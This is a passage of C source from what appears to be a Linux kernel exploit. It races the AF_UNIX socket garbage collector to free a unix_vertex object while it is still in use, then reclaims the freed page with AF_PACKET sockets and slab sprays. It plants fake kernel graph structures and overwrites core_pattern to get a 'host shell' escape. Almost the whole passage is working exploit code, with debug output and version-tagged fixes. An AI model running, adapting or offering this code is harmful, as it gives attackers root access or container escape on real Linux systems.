	while (!atomic_load_explicit(&splice_ctx.ready, memory_order_acquire))
		sched_yield();
	if (wait_thread_blocked(&splice_ctx.tid, &splice_ctx.done,
				wchan, sizeof(wchan)) != 0)
		fail("pc-hijack splice thread did not block");
	printf("[D] splice blocked ok\n");
	fflush(stdout);

	/* Fix #25 v2: separate SCCs.
	   SCC_A = {ab[0]} self-loop + pipe canaries → DEAD after close(ab[0]).
	   SCC_B = {bb[0]} 253 self-loops from stage1, fd open → ALIVE.
	   No B→A edge: ab[0] NOT in bb[0]'s queue, so fput chain frees vertex A
	   fully when SCC_A is collected. */
	if (send_repeated_fd(ab[1], ab[0], 1, 'A') != 0)
		die("pc-hijack send SCC_A self-loop");
	old_special[0] = signal1[1];
	old_special[1] = stall_pipe[1];
	old_special[2] = init_done[1];
	if (send_fds(ab[1], old_special, 3, 'S') != 0)
		die("pc-hijack send signals to A");
	if (send_repeated_fd(bb[0], bb[1], 1, 'X') != 0)
		die("pc-hijack send X->X");
	pin_to_cpu(0);
	drain_anchored_vertex_messages(&a_vertex);
	drain_anchored_vertex_messages(&b_vertex);
	close(stall_pipe[1]);
	close(signal1[1]);
	close(init_done[1]);
	close(ab[0]);

	printf("[D] graph edges done\n"); fflush(stdout);
	stage1_fault_page = prepare_missing_region(KERNEL_PAGE_SIZE);
	prepare_mm_stall(&stage_gate, PC_STAGE_GATE_MIB * MIB);
	atomic_init(&stage_gate_run, 0);
	atomic_init(&stage_gate_started, 0);
	atomic_init(&stage_gate_stop, 0);
	stage_gate.external_run = &stage_gate_run;
	stage_gate.external_started = &stage_gate_started;
	stage_gate.external_stop = &stage_gate_stop;
	printf("[D] stage_gate prepared\n"); fflush(stdout);
	if (fill_sender_wmem(stage_client) != 0)
		die("pc-hijack fill stage1 sender");
	for (i = 0; i < SCM_FD_COUNT - 1; i++)
		stage1.fds[i] = bb[0];
	stage1.fds[SCM_FD_COUNT - 1] = marker[1];
	stage1.sock = stage_client;
	stage1.cpu = 0;
	stage1.sched_idle = true;
	stage1.isolated_uid = 0;
	stage1.fault_page = stage1_fault_page;
	atomic_init(&stage1_hold, 0);
	stage1.hold_after_send = &stage1_hold;
	atomic_init(&stage1.ready, 0);
	atomic_init(&stage1.go, 0);
	atomic_init(&stage1.entered, 0);
	atomic_init(&stage1.done, 0);
	if (pthread_create(&stage1_thread, NULL, stage2_sender,
			   &stage1) != 0)
		die("pthread_create pc-hijack stage1");
	while (!atomic_load_explicit(&stage1.ready, memory_order_acquire))
		sched_yield();
	atomic_store_explicit(&stage1.go, 1, memory_order_release);
	if (wait_sender_blocked(&stage1, wchan, sizeof(wchan)) != 0)
		fail("pc-hijack stage1 sender did not block");
	printf("[D] stage1 blocked ok\n");
	fflush(stdout);
	/* Fix #25 v2: do NOT close bb[0] — keep SCC_B alive. */
	close(marker[1]);

	/* init_done[1] rides on SCC_A (sent via ab[1] above).
	   trigger_gc_once → __unix_gc collects SCC_A → fput(init_done[1]) → POLLHUP. */
	trigger_gc_once();
	if (wait_pipe_hup(init_done[0], STAGE1_TIMEOUT_MSEC) != 0) {
		printf("[D] FAILED: signal1_hup=%d\n",
		       wait_pipe_hup(signal1[0], 0) == 0);
		fflush(stdout);
		fail("pc-hijack initial GC sentinel was not collected");
	}
	printf("[D] GC sentinel collected ok (signal1_hup=%d)\n",
	       wait_pipe_hup(signal1[0], 0) == 0);
	fflush(stdout);
	gc_flush_barrier(barrier_sender, barrier_fd);
	for (i = 0; i < ARRAY_SIZE(pc_vertex_prefill); i++)
		drain_vertex_prefill(pc_vertex_prefill[i]);
	gc_flush_barrier(barrier_sender, barrier_fd);
	recv_and_close_fds(filler[0], SCM_FD_COUNT);
	gc_closer.fd = -1;
	gc_closer.cpu = 1;
	gc_closer.delay = 0;
	gc_closer.flush_gc = true;
	gc_closer.prime_gc = true;
	gc_closer.flush_sender = barrier_sender;
	gc_closer.flush_pass_fd = barrier_fd;
	gc_closer.wait_target = &stage1.done;
	gc_closer.monitor_sender = &stage1.done;
	atomic_init(&gc_closer.ready, 0);
	atomic_init(&gc_closer.go, 0);
	atomic_init(&gc_closer.done, 0);
	if (pthread_create(&gc_close_thread, NULL, gc_close_worker,
			   &gc_closer) != 0)
		die("pthread_create pc-hijack GC trigger");
	while (!atomic_load_explicit(&gc_closer.ready, memory_order_acquire))
		sched_yield();
	futex_set(&gc_closer.go);
	if (pthread_create(&stage_gate_thread, NULL, mm_write_lock_staller,
			   &stage_gate_worker) != 0)
		die("pthread_create pc-hijack FPL gate");
	futex_set(&stage_gate.go);
	while (!atomic_load_explicit(&stage_gate.ready, memory_order_acquire))
		sched_yield();
	futex_set(&stage_gate_run);
	while (!atomic_load_explicit(&stage_gate_started,
				     memory_order_acquire))
		sched_yield();
	sleep_usec(1000);
	pin_to_cpu(0);
	if (setsockopt(stage_client, SOL_SOCKET, SO_SNDBUF, &large_sndbuf,
		       sizeof(large_sndbuf)) != 0)
		die("pc-hijack wake stage1 sender");
	if (wait_sender_mmap_blocked(&stage1, wchan, sizeof(wchan)) != 0)
		fail("pc-hijack stage1 did not stop after FPL preparation");
	atomic_store_explicit(&stage_gate_stop, 1, memory_order_release);
	if (pthread_join(stage_gate_thread, NULL) != 0)
		die("pthread_join pc-hijack FPL gate");
	if (stage_gate.ret < 0) {
		errno = stage_gate.err;
		die("pc-hijack FPL gate");
	}
	printf("[D] released FPL ok\n");
	fflush(stdout);
	if (wait_pipe_hup(signal1[0], PC_STALE_TIMEOUT_MSEC) != 0) {
		int gc_was_done = atomic_load_explicit(&gc_closer.done,
						       memory_order_acquire);
		printf("[O] stale timeout: sender_done=%d marker_hup=%d"
		       " gc_done_before_join=%d gc_ret=%d"
		       " sender_before_gc=%d sender_after_gc=%d\n",
		       atomic_load_explicit(&stage1.done,
					    memory_order_acquire),
		       wait_pipe_hup(marker[0], 0) == 0,
		       gc_was_done,
		       gc_closer.ret,
		       gc_closer.sender_before_gc,
		       gc_closer.sender_after_gc);
		fflush(stdout);
		for (i = 0; i < 20; i++) {
			trigger_gc_once();
			sleep_usec(100000);
			if (wait_pipe_hup(signal1[0], 0) == 0) {
				printf("[+] stale A freed on retry GC #%zu\n",
				       i + 1);
				fflush(stdout);
				goto stale_freed;
			}
		}
		printf("[O] stale A not freed after 20 retry GCs."
		       " sender_done=%d\n",
		       atomic_load_explicit(&stage1.done,
					    memory_order_acquire));
		fflush(stdout);
		fprintf(stderr, "[-] pc-hijack stale A free timed out\n");
		_exit(21);
	}
stale_freed:
	pthread_join(gc_close_thread, NULL);
	printf("[D] stale A freed ok\n");
	fflush(stdout);
	sleep_usec(PC_SAFE_GC_WAIT_USEC);
	while (!atomic_load_explicit(&stage1.done, memory_order_acquire))
		sched_yield();
	if (stage1.ret != 1) {
		errno = stage1.err;
		die("pc-hijack stage1 sendmsg");
	}
	if (wait_pipe_hup(marker[0], 0) == 0)
		printf("[W] marker collected (SCC GC); continuing\n");
	fflush(stdout);
	atomic_store_explicit(&stage1_hold, 1, memory_order_release);
	pthread_join(stage1_thread, NULL);
	printf("[+] pc-hijack: stale A freed at PFN %#llx\n",
	       (unsigned long long)a_anchor.pfn);
	/* V104: pre-allocate ALL reclaim sockets BEFORE V102 cleanup.
	   8192 socket(AF_PACKET) + 48 socketpair(AF_UNIX) create massive
	   kernel slab pressure.  If done after V102 frees the slab page,
	   these allocations steal the freed page (observed as PGTABLE or
	   external-SLAB on remote).  Doing them while the page is still
	   occupied prevents the theft. */
	prepared_reclaim_fds = calloc(PACKET_RECLAIM_CANDIDATES,
				      sizeof(*prepared_reclaim_fds));
	if (!prepared_reclaim_fds)
		die("calloc pc-hijack prepared reclaim sockets");
	for (i = 0; i < PACKET_RECLAIM_CANDIDATES; i++) {
		int version = TPACKET_V1;

		prepared_reclaim_fds[i] = socket(AF_PACKET,
			SOCK_DGRAM | SOCK_CLOEXEC, 0);
		if (prepared_reclaim_fds[i] < 0)
			die("socket pc-hijack prepared reclaim");
		if (setsockopt(prepared_reclaim_fds[i], SOL_PACKET,
			       PACKET_VERSION, &version, sizeof(version)) != 0)
			die("PACKET_VERSION pc-hijack prepared reclaim");
	}
	for (i = 0; i < ARRAY_SIZE(prepared_vertex_drain_fds); i++) {
		int vdpair[2];
		if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC,
			       0, vdpair) != 0)
			die("socketpair pc-hijack prepared vertex drain");
		prepared_vertex_drain_fds[i] = vdpair[0];
		prepared_vertex_drain_peers[i] = vdpair[1];
	}
	rcl_ncpus = (int)sysconf(_SC_NPROCESSORS_ONLN);
	if (rcl_ncpus < 1) rcl_ncpus = 2;
	rcl_kpc_fd = open("/proc/kpagecount", O_RDONLY | O_CLOEXEC);
	if (rcl_kpc_fd < 0) die("open kpagecount pre");
	rcl_kpf_fd = open("/proc/kpageflags", O_RDONLY | O_CLOEXEC);
	if (rcl_kpf_fd < 0) die("open kpageflags pre");
	rcl_mappings = calloc(PACKET_RECLAIM_CANDIDATES,
			      sizeof(*rcl_mappings));
	if (!rcl_mappings) die("calloc reclaim pre");
	g_predrain_fds = prepared_reclaim_fds;
	g_predrain_mappings = rcl_mappings;
	g_predrain_count = 0;
	g_predrain_max = PACKET_RECLAIM_CANDIDATES;
	g_predrain_ncpus = rcl_ncpus;
	printf("[D] V104 pre-alloc done: %d sockets %d CPUs\n",
	       PACKET_RECLAIM_CANDIDATES, rcl_ncpus);
	fflush(stdout);
	int v131_skip_drain = 0;
	/* V102: page goes FREE after this block работает не трогать!!! */
	{
		size_t vi;
		struct rnd96_counts v102_before, v102_after;
		read_rnd96_counts(&v102_before);
		for (vi = 0; vi < (size_t)a_vertex.filler_count; vi++) {
			close(a_vertex.filler_pairs[vi][0]);
			close(a_vertex.filler_pairs[vi][1]);
		}
		for (vi = 0; vi < ANCHORED_VERTEX_CANDIDATES; vi++) {
			if (a_vertex.candidate_pairs[vi][0] >= 0)
				close(a_vertex.candidate_pairs[vi][0]);
			if (a_vertex.candidate_pairs[vi][1] >= 0)
				close(a_vertex.candidate_pairs[vi][1]);
		}
		sleep_usec(1000);
		read_rnd96_counts(&v102_after);
		printf("[D] V102 slab delta: active %ld->%ld (-%ld)"
		       " total %ld->%ld (-%ld)"
		       " filler=%zu cand_max=%d\n",
		       v102_before.active[vertex_cache],
		       v102_after.active[vertex_cache],
		       v102_before.active[vertex_cache] -
		       v102_after.active[vertex_cache],
		       v102_before.total[vertex_cache],
		       v102_after.total[vertex_cache],
		       v102_before.total[vertex_cache] -
		       v102_after.total[vertex_cache],
		       a_vertex.filler_count,
		       ANCHORED_VERTEX_CANDIDATES);
		fflush(stdout);
		{
			int chk_fd = open("/proc/kpageflags",
					  O_RDONLY | O_CLOEXEC);
			if (chk_fd >= 0) {
				uint64_t fl = read_kpageflag_at(chk_fd,
						a_anchor.pfn);
				if (fl & (1ULL << 26)) {
					printf("[D] V131: PGTABLE after V102,"
					       " fast-fail pfn=%#llx\n",
					       (unsigned long long)a_anchor.pfn);
					fflush(stdout);
					close(chk_fd);
					_exit(31);
				}
				v131_skip_drain =
					!(fl & (1ULL << KPF_SLAB));
				printf("[D] V102 post-cleanup: pfn=%#llx"
				       " fl=0x%llx%s%s\n",
				       (unsigned long long)a_anchor.pfn,
				       (unsigned long long)fl,
				       (fl & (1ULL << KPF_SLAB)) ?
				       " SLAB" : " FREE",
				       v131_skip_drain ?
				       " V131-fast" : "");
				fflush(stdout);
				close(chk_fd);
			}
		}
	}
	/*нужен r-w монтированный /proc/sys. На таргете не так, пусть будет.*/
	if (poc_mode_is("slab-dirtymode")) {
		int spray_fds[SLAB_SPRAY_COUNT];
		int sprayed, si;

		printf("[+] V139: slab spray DirtyMode path\n");
		fflush(stdout);

		sprayed = spray_vertex_slot_for_dirtymode(
				kbase, SLAB_SPRAY_COUNT, spray_fds);
		if (sprayed < 1)
			fail("V139: slab spray produced zero sockets");

		close(stall_sock[1]);
		if (pthread_join(splice_thread, NULL) != 0)
			die("pthread_join V139 splice");
		printf("[D] V139: fput gate released -> bilateral write done\n");
		fflush(stdout);

		sleep_usec(50000);

		trigger_core_pattern_escape(kbase);

		for (si = 0; si < sprayed; si++)
			if (spray_fds[si] >= 0) close(spray_fds[si]);

		if (escape_succeeded) {
			printf("[+] V139: ESCAPE SUCCESS\n");
			fflush(stdout);
		}
		_exit(escape_succeeded ? 0 : 1);
	}
	printf("[D] reclaim pre-setup: %d CPUs skip_drain=%d\n",
	       rcl_ncpus, v131_skip_drain);
	fflush(stdout);
	{
		if (!v131_skip_drain)
			(void)force_vertex_slab_release(
				    a_anchor.pfn, barrier_fd,
				    prepared_vertex_drain_fds,
				    prepared_vertex_drain_peers);
		else {
			printf("[D] V131: page FREE, skip drain\n");
			fflush(stdout);
		}

		if (g_movable_winner_found &&
		    g_movable_winner != NULL) {
			reclaimed.fd = -1;
			reclaimed.mapping = g_movable_winner;
			reclaimed.length = KERNEL_PAGE_SIZE;
			reclaimed.page_count = 1;
			reclaimed.pfn = a_anchor.pfn;
			reclaimed.direct_map_address =
				direct_map_base +
				a_anchor.pfn * KERNEL_PAGE_SIZE;
			printf("[+] V76 MOVABLE reclaim"
			       " — skipping AF_PACKET\n");
			fflush(stdout);
		} else {
		reclaim_exact_pfn_as_packet_page(
			&reclaimed, a_anchor.pfn, direct_map_base,
			prepared_reclaim_fds);
		}
	}
	close(rcl_kpc_fd);
	close(rcl_kpf_fd);
	if (poc_mode_is("dirtymode"))
		build_dirtymode_graph(&reclaimed, &support,
			objects_per_slab, b_vertex.address, kbase);
	else
		(void)build_candidate_pc_hijack_graph(&reclaimed, &support,
			objects_per_slab, b_vertex.address, kbase);
	close(stall_sock[1]);
	if (pthread_join(splice_thread, NULL) != 0)
		die("pthread_join pc-hijack splice");
	printf("[D] fput gate released ok\n");
	fflush(stdout);
	sleep_usec(20000);

	/* ── Fix #25 v2: one-shot exploit via vertex B ──
	   Vertex B survived sentinel GC (SCC_B alive: bb[0] fd open).
	   Now rewire vertex B to use the fake graph for collection.
	   Key trick: fake edge successor → fake_unix_sock → vertex
	   points back to vertex B itself, so scc_index self-compares
	   and always matches regardless of Tarjan's assigned value. */
	{
		uint64_t u = support.direct_map_address +
			     PC_UNIX_SOCK_OFFSET;
		uint64_t edge0 = support.direct_map_address;
		uint64_t edge0_ve = edge0 +
				    UNIX_EDGE_VERTEX_ENTRY_OFFSET;
		unsigned char *vb;
		unsigned char *edge_bytes;

		store_u64((unsigned char *)support.mapping +
			  PC_UNIX_SOCK_OFFSET,
			  UNIX_SOCK_VERTEX_OFFSET, b_vertex.address);
		edge_bytes = packet_address_pointer(&support, edge0, 48);
		store_u64(edge_bytes, UNIX_EDGE_VERTEX_ENTRY_OFFSET,
			  b_vertex.address);
		store_u64(edge_bytes, UNIX_EDGE_VERTEX_ENTRY_OFFSET + 8,
			  b_vertex.address);
		vb = packet_address_pointer(&b_anchor, b_vertex.address,
					    72);
		store_u64(vb, 0, edge0_ve);
		store_u64(vb, 8, edge0_ve);
		store_u64(vb, UNIX_VERTEX_OUT_DEGREE_OFFSET, 1);
		atomic_thread_fence(memory_order_seq_cst);
		printf("[D] exploit: vB=%#llx edge_ve=%#llx u=%#llx\n",
		       (unsigned long long)b_vertex.address,
		       (unsigned long long)edge0_ve,
		       (unsigned long long)u);
		fflush(stdout);
	}
	{
		int gpair[2];
		if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC,
			       0, gpair) == 0) {
			if (send_repeated_fd(gpair[0], gpair[1],
					     1, 'g') != 0)
				printf("[D] grouped-reset send failed:"
				       " %s\n", strerror(errno));
			close(gpair[0]);
			close(gpair[1]);
		}
	}
	pin_to_cpu(1);
	if (poc_mode_is("dirtymode")) {
		struct stat st;

		trigger_gc_once();
		sleep_usec(250000);
		if (stat("/proc/sys/kernel/core_pattern", &st) == 0)
			printf("[O] DirtyMode resulting core_pattern"
			       " mode=%#o\n",
			       st.st_mode & 07777);
	} else {
		trigger_gc_once();
	}
	if (!wait_for_escape_signal(PC_WATCH_TIMEOUT_USEC))
		fail("host shell did not start");
	while (!escape_shell_finished)
		sleep_usec(10000);
}

static void run_stale_scc_attempt(uint64_t kbase)
{
	int ab[2], bb[2], filler[2];
	int stage2_pair[STAGE2_COUNT][2];
	int stage2_fds[STAGE2_COUNT][SCM_FD_COUNT];
	int stall_sock[2], stall_pipe[2], signal1[2], marker[2];
	int old_special[3], filler_fds[SCM_FD_COUNT];
	int kmalloc96_fence[KMALLOC96_FENCE_SOCKET_COUNT];
	int barrier_sender, barrier_fd, null_fd;
	int trigger_fd, probe_fd, stage1_gc_trigger_fd;
	int large_sndbuf = LARGE_SNDBUF;
	char page_data[KERNEL_PAGE_SIZE];
	char wchan[128] = "unknown";
	void *stage1_fault_page;
	struct splice_ctx splice_ctx = {0};
	struct stage2_ctx stage1 = {0};
	struct vertex_prefill_gate *vertex_prefill[VERTEX_PREFILL_CPU_COUNT];
	struct stage2_proc_ctrl *stage2_ctrl;
	atomic_int stage1_hold;
	pthread_t splice_thread, stage1_thread;
	pid_t stage2_pid[STAGE2_COUNT];
	size_t candidate, i;
	unsigned long initial_taint = read_kernel_taint();

	timing_mark("stage1 setup start");
	printf("[*] stage 1: constructing stale SCC and blocked GC purge\n");
	if (make_unix_socketpair(ab) || make_unix_socketpair(bb) ||
	    make_unix_socketpair(filler) || make_unix_socketpair(stall_sock))
		die("socketpair");
	for (i = 0; i < 4; i++) {
		if (dup(filler[0]) < 0)
			die("dup filler cycle");
	}
	for (candidate = 0; candidate < STAGE2_COUNT; candidate++) {
		if (make_unix_socketpair(stage2_pair[candidate]) != 0)
			die("stage2 socketpair");
		for (i = 0; i < SCM_FD_COUNT; i++) {
			stage2_fds[candidate][i] = socket(
				AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
			if (stage2_fds[candidate][i] < 0)
				die("stage2 predecessor socket");
		}
	}
	if (pipe2(stall_pipe, O_CLOEXEC) || pipe2(signal1, O_CLOEXEC) ||
	    pipe2(marker, O_CLOEXEC))
		die("pipe2");
	null_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
	barrier_sender = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	barrier_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (null_fd < 0 || barrier_sender < 0 || barrier_fd < 0)
		die("barrier descriptors");
	trigger_fd = create_root_trigger_socket(kbase);
	probe_fd = create_root_trigger_socket(kbase);

	stage2_ctrl = mmap(NULL,
			   sizeof(*stage2_ctrl) * STAGE2_COUNT,
			   PROT_READ | PROT_WRITE,
			   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (stage2_ctrl == MAP_FAILED)
		die("mmap stage2 controls");
	memset(stage2_ctrl, 0,
	       sizeof(*stage2_ctrl) * STAGE2_COUNT);
	for (candidate = 0; candidate < STAGE2_COUNT; candidate++) {
		atomic_init(&stage2_ctrl[candidate].ready, 0);
		atomic_init(&stage2_ctrl[candidate].go, 0);
		atomic_init(&stage2_ctrl[candidate].send_go, 0);
		atomic_init(&stage2_ctrl[candidate].stall_ready, 0);
		atomic_init(&stage2_ctrl[candidate].stall_run, 0);
		atomic_init(&stage2_ctrl[candidate].stall_started, 0);
		atomic_init(&stage2_ctrl[candidate].hole_ready, 0);
		atomic_init(&stage2_ctrl[candidate].launch_go, 0);
		atomic_init(&stage2_ctrl[candidate].entered, 0);
		atomic_init(&stage2_ctrl[candidate].send_returned, 0);
		atomic_init(&stage2_ctrl[candidate].spray_go, 0);
		atomic_init(&stage2_ctrl[candidate].send_done, 0);
		atomic_init(&stage2_ctrl[candidate].trigger_go, 0);
		atomic_init(&stage2_ctrl[candidate].done, 0);
	}
	for (candidate = 0; candidate < STAGE2_COUNT; candidate++) {
		stage2_pid[candidate] = fork();
		if (stage2_pid[candidate] < 0)
			die("fork stage2");
		if (stage2_pid[candidate] == 0) {
			size_t fd_i, other;

			close(ab[0]);
			close(ab[1]);
			close(bb[0]);
			close(bb[1]);
			close(filler[0]);
			close(filler[1]);
			close(stall_sock[0]);
			close(stall_sock[1]);
			close(stall_pipe[0]);
			close(stall_pipe[1]);
			close(signal1[0]);
			close(signal1[1]);
			close(marker[0]);
			close(marker[1]);
			close(null_fd);
			close(barrier_sender);
			close(barrier_fd);
			close(trigger_fd);
			close(probe_fd);

			for (other = 0; other < STAGE2_COUNT; other++) {
				close(stage2_pair[other][1]);
				if (other == candidate)
					continue;
				close(stage2_pair[other][0]);
				for (fd_i = 0; fd_i < SCM_FD_COUNT; fd_i++)
					close(stage2_fds[other][fd_i]);
			}

			run_reclaim_process(candidate,
					   stage2_pair[candidate][0],
					   stage2_fds[candidate],
					   kbase,
					   &stage2_ctrl[candidate]);
		}
	}
	for (candidate = 0; candidate < STAGE2_COUNT; candidate++) {
		wait_stage2_child_ready(stage2_pid[candidate],
					&stage2_ctrl[candidate].ready,
					candidate);
	}
	printf("[+] stage2 mmap-lock processes prepared without stage1 descriptors\n");
	timing_mark("stage2 workers ready");
	snapshot_rnd96("before-prefill");
	for (i = 0; i < ARRAY_SIZE(vertex_prefill); i++) {
		vertex_prefill[i] = prepare_vertex_prefill((int)i);
		publish_vertex_prefill(vertex_prefill[i]);
	}
	snapshot_rnd96("after-prefill");
	printf("[+] fenced pre-existing unix_vertex partial slabs on both CPUs\n");
	for (candidate = 0; candidate < STAGE2_COUNT; candidate++) {
		if (!atomic_load_explicit(
			    &stage2_ctrl[candidate].hole_ready,
			    memory_order_acquire))
			fail("stage2 edge hole was not staged");
	}
	printf("[+] stage2 edge-array holes are held by tmpfs xattrs\n");
	printf("[*] stage 0: completing post-filter Normal-zone pressure\n");
	top_off_normal_zone();
	printf("[+] post-filter Normal-zone pressure complete\n");
	timing_mark("post-filter pressure complete");

	/*
	 * Arm the mmap write-lock stalls before creating the stale vertex.
	 * Otherwise the freed kmalloc-96 object sits idle for a full
	 * multi-gigabyte mprotect pass before stage2 can claim it.
	 */
	for (candidate = 0; candidate < STAGE2_COUNT; candidate++)
		futex_set(&stage2_ctrl[candidate].send_go);
	for (candidate = 0; candidate < STAGE2_COUNT; candidate++) {
		while (!atomic_load_explicit(
			       &stage2_ctrl[candidate].stall_ready,
			       memory_order_acquire))
			sleep_usec(100);
	}
	printf("[+] stage2 lock stalls armed\n");
	timing_mark("stage2 prearm complete");

	/*
	 * Seven ordinary-file batches provide removable inflight pressure. The
	 * final batch contributes the sole F -> F edge that keeps fast GC active.
	 */
	for (i = 0; i < ARRAY_SIZE(filler_fds); i++)
		filler_fds[i] = null_fd;
	for (i = 0; i < GC_FILLER_BATCHES; i++) {
		if (i == GC_FILLER_BATCHES - 1)
			filler_fds[0] = filler[0];
		if (send_fds(filler[1], filler_fds,
			     ARRAY_SIZE(filler_fds), 'f') != 0)
			die("filler inflight batch");
	}

	if (fcntl(stall_pipe[0], F_SETPIPE_SZ, KERNEL_PAGE_SIZE) < 0)
		die("F_SETPIPE_SZ");
	memset(page_data, 'P', sizeof(page_data));
	if (write(stall_pipe[1], page_data, sizeof(page_data)) !=
	    (ssize_t)sizeof(page_data))
		die("write stall pipe");
	if (fill_sender_wmem(stall_sock[0]) != 0)
		die("fill stall socket");

	splice_ctx.pipe_read = stall_pipe[0];
	splice_ctx.sock = stall_sock[0];
	atomic_init(&splice_ctx.ready, 0);
	atomic_init(&splice_ctx.done, 0);
	if (pthread_create(&splice_thread, NULL, splice_staller,
			   &splice_ctx) != 0)
		die("pthread_create splice");
	while (!atomic_load_explicit(&splice_ctx.ready, memory_order_acquire))
		sched_yield();
	if (wait_thread_blocked(&splice_ctx.tid, &splice_ctx.done,
				wchan, sizeof(wchan)) != 0)
		fail("splice thread did not block");
	printf("[+] splice holds pipe mutex, wchan=%s\n", wchan);

	/* Old B -> A edge. */
	if (send_repeated_fd(ab[1], bb[0], 1, 'a') != 0)
		die("send B->A");

	/*
	 * GC first frees A's vertex synchronously. Kernel-thread fput() is
	 * deferred and inserted LIFO, so delayed-fput processing closes the
	 * signal first, blocks on the stall pipe, and leaves A's file alive.
	 */
	old_special[0] = signal1[1];
	old_special[1] = stall_pipe[1];
	old_special[2] = ab[0];
	if (send_fds(bb[1], old_special, ARRAY_SIZE(old_special), 'b') != 0)
		die("send A->B special");
	hold_kmalloc96_fence(kmalloc96_fence);
	close(stall_pipe[1]);
	close(signal1[1]);

	close(ab[0]);

	stage1_fault_page = prepare_missing_region(KERNEL_PAGE_SIZE);
	*(volatile unsigned char *)stage1_fault_page = 'S';
	if (fill_sender_wmem(ab[1]) != 0)
		die("fill stage1 sender");
	stage1_gc_trigger_fd = socket(
		AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (stage1_gc_trigger_fd < 0)
		die("stage1 GC trigger socket");

	for (i = 0; i < SCM_FD_COUNT - 1; i++)
		stage1.fds[i] = bb[0];
	stage1.fds[SCM_FD_COUNT - 1] = marker[1];
	stage1.sock = ab[1];
	stage1.cpu = 0;
	stage1.fault_page = stage1_fault_page;
	atomic_init(&stage1_hold, 0);
	stage1.hold_after_send = &stage1_hold;
	atomic_init(&stage1.ready, 0);
	atomic_init(&stage1.go, 0);
	atomic_init(&stage1.entered, 0);
	atomic_init(&stage1.done, 0);
	if (pthread_create(&stage1_thread, NULL, stage2_sender,
			   &stage1) != 0)
		die("pthread_create stage1");
	while (!atomic_load_explicit(&stage1.ready, memory_order_acquire))
		sched_yield();
	atomic_store_explicit(&stage1.go, 1, memory_order_release);
	if (wait_sender_blocked(&stage1, wchan, sizeof(wchan)) != 0)
		fail("stage1 sender did not block on socket memory");
	printf("[+] stage1 sender blocked after FPL preparation, wchan=%s\n",
	       wchan);

	close(bb[0]);
	close(marker[1]);

	/*
	 * Force a completed full walk while the 252 references are still private
	 * to the blocked sender. This leaves the live A/B SCC grouped. Once the
	 * sender is released, a second CPU races the cached fast walk against skb
	 * publication.
	 */
	trigger_gc_once();
	gc_flush_barrier(barrier_sender, barrier_fd);
	printf("[+] initial live SCC grouping completed\n");
	if (poc_mode_is("free-gc")) {
		printf("[*] free-gc: pre-race trace attach window pid=%d\n",
		       getpid());
		sleep(25);
	}
	pin_to_cpu(1);
	if (setsockopt(ab[1], SOL_SOCKET, SO_SNDBUF, &large_sndbuf,
		       sizeof(large_sndbuf)) != 0)
		die("wake stage1 sender");
	busy_wait_usec(stage1_gc_delay_usec);
	close(stage1_gc_trigger_fd);
	timing_mark("stage1 sender released and GC trigger closed");

	if (wait_pipe_hup(signal1[0], STAGE1_TIMEOUT_MSEC) != 0) {
		terminate_children(stage2_pid, STAGE2_COUNT);
		fail("timed out waiting for stale vertex free");
	}
	while (!atomic_load_explicit(&stage1.done, memory_order_acquire))
		sched_yield();
	if (stage1.ret != 1) {
		errno = stage1.err;
		die("stage1 sendmsg");
	}
	printf("[+] stale A vertex freed; delayed-fput worker is blocked\n");
	snapshot_rnd96("after-stale-free");
	if (wait_pipe_hup(marker[0], 0) == 0)
		printf("[W] marker collected (SCC GC); continuing\n");
	timing_mark("stale vertex race complete");
	if (poc_mode_is("free-gc")) {
		unsigned long taint_before = read_kernel_taint();
		unsigned long taint_after;

		/*
		 * Do not use gc_flush_barrier() here: preparing its SCM FPL
		 * would allocate and zero a replacement unix_vertex first.
		 * The stale-free notification can arrive before the collecting
		 * unix_gc() clears gc_in_progress, so let that walk retire before
		 * closing a fresh socket to queue the cached follow-up walk.
		 */
		printf("[*] free-gc: waiting for the collecting GC to retire\n");
		printf("[*] free-gc: trace attach window pid=%d\n", getpid());
		sleep(40);
		printf("[*] free-gc: scheduling cached GC before reallocation\n");
		trigger_gc_once();
		sleep_usec(1000000);
		taint_after = read_kernel_taint();
		printf("[+] free-gc: GC wait complete, taint %#lx -> %#lx\n",
		       taint_before, taint_after);
		snapshot_rnd96("after-free-gc");
		if (wait_pipe_hup(marker[0], 0) == 0)
			printf("[!] free-gc: the staged skb was collected\n");
		else
			printf("[+] free-gc: staged skb remains queued\n");
		printf("[*] free-gc: trace collection window\n");
		sleep(30);
		_exit(0);
	}
	printf("[*] stage 2: reclaiming the stale vertex with a blocked FPL\n");
	atomic_store_explicit(&stage1_hold, 1, memory_order_release);
	pthread_join(stage1_thread, NULL);
	for (i = 0; i < STAGE2_DRAIN_BATCHES; i++)
		recv_and_close_fds(filler[0], ARRAY_SIZE(filler_fds));
	printf("[+] lowered unix_inflight below the stage2 synchronous-GC threshold\n");
	printf("[+] stage2 edge-array holes are RCU-reclaimed\n");
	timing_mark("stage2 edge holes ready");

	pin_to_cpu(1);
	timing_mark("kmalloc-96 partial lists drained");
	for (candidate = 0; candidate < STAGE2_COUNT; candidate++)
		futex_set(&stage2_ctrl[candidate].stall_run);
	for (candidate = 0; candidate < STAGE2_COUNT; candidate++)
		wait_stage2_stall_started(&stage2_ctrl[candidate], candidate);
	busy_wait_usec(STAGE2_SPINUP_USEC);
	for (candidate = 0; candidate < STAGE2_COUNT; candidate++)
		futex_set(&stage2_ctrl[candidate].launch_go);

	for (candidate = 0; candidate < STAGE2_COUNT; candidate++) {
		for (i = 0; i < 10000; i++) {
			if (atomic_load_explicit(
				    &stage2_ctrl[candidate].entered,
				    memory_order_acquire))
				break;
			sleep_usec(100);
		}
		if (i == 10000)
			fail("stage2 process did not enter sendmsg");
		if (wait_process_mmap_blocked(stage2_pid[candidate],
					      &stage2_ctrl[candidate],
					      wchan,
					      sizeof(wchan)) != 0)
			fail("stage2 sender did not block after FPL preparation");
		printf("[+] stage2 candidate %zu blocked, wchan=%s\n",
		       candidate, wchan);
	}
	printf("[+] stage2 sends are blocked after FPL preparation\n");
	snapshot_rnd96("stage2-blocked");
	timing_mark("stage2 sender blocked");

	for (i = 0; i < ARRAY_SIZE(filler_fds); i++)
